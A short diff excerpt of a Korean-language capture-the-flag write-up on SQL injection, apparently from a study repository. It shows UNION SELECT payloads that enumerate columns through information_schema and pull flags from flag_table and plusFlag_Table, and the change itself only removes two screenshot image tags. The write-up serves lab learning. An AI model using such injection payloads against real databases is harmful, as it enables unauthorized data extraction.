@@ -71,14 +71,12 @@ normaltic' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE 
 normaltic' UNION SELECT flag,2,3,4 FROM flag_table -- 
 ```
 ✅ flag 컬럼에서 플래그 출력 성공
-<img src="https://github.com/user-attachments/assets/568a6c00-9b4d-4a97-9877-a990681e4ec3" width="600"/>
 
 🎯 시도 8 – 또 다른 flag 컬럼? (plusFlag_Table)
 ```
 normaltic' UNION SELECT idx,flag,3,4 FROM plusFlag_Table -- 
 ```
 ✅ 두 번째 플래그 후보도 발견
-<img src="https://github.com/user-attachments/assets/76dbd42a-1d64-4751-9003-ebf240d41f03" width="600"/>
 
 
 ## 치트시트 정리 
